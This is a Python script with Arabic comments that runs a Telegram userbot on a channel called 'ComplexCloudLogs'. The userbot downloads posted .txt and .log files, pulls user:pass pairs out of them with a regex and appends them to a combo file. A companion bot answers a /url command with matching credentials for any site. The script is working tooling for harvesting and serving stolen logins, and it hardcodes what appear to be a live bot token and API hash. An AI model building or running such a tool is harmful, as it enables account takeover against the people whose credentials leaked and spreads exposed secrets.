import telebot
from telethon import TelegramClient, events
import threading
import re
import os
import sys

# إعداداتك (تأكد من صحة الـ API ID و الـ Hash)
BOT_TOKEN = '8645297843:AAE7x0GWqbXlJRNv7I2Qt14nenCEL9IiIs8'
API_ID = 34023364
API_HASH = 'ad07473755a47402aef9c3d580886cdf'
TARGET_CHANNEL = 'ComplexCloudLogs' # اليوزر نيم بلا @
COMBO_FILE = "ulp.txt"

bot = telebot.TeleBot(BOT_TOKEN)
client = TelegramClient('Moha_Session', API_ID, API_HASH)

@client.on(events.NewMessage(chats=TARGET_CHANNEL))
async def hunter(event):
    # الصيد من الملفات (txt/log) كما في الهاتف
    if event.message.document and (event.message.file.ext in ['.txt', '.log']):
        path = await event.message.download_media()
        print(f"📥 جاري معالجة ملف: {event.message.file.name}")
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            data = f.read()
            # استخراج الحسابات (user:pass)
            matches = re.findall(r'([a-zA-Z0-9._-]+:[a-zA-Z0-9!@#$%^&*._-]+)', data)
            with open(COMBO_FILE, "a", encoding='utf-8') as out:
                for m in matches:
                    out.write(f"{m}\n")
        os.remove(path)
        print(f"✅ تم صيد {len(matches)} حساب من الملف!")

@bot.message_handler(commands=['url'])
def search(message):
    query = message.text.replace('/url', '').strip().lower()
    if os.path.exists(COMBO_FILE):
        with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
            res = [l.strip() for l in f if query in l.lower()]
            if res:
                bot.reply_to(message, f"🎯 لقيتلك هاد الصيد لـ {query}:\n\n" + "\n".join(res[:15]))
            else:
                bot.reply_to(message, "❌ مزال ما صيدناش هاد الموقع، اصبر شوية.")
    else:
        bot.reply_to(message, "⏳ الماكينة بدأت، بصح الملف مزال فارغ.")

def start():
    print("🚀 الماكينة بدأت تزغرد... الصيد والاستخراج شغالين!")
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    client.start()
    client.run_until_disconnected()

if __name__ == "__main__":
    start()
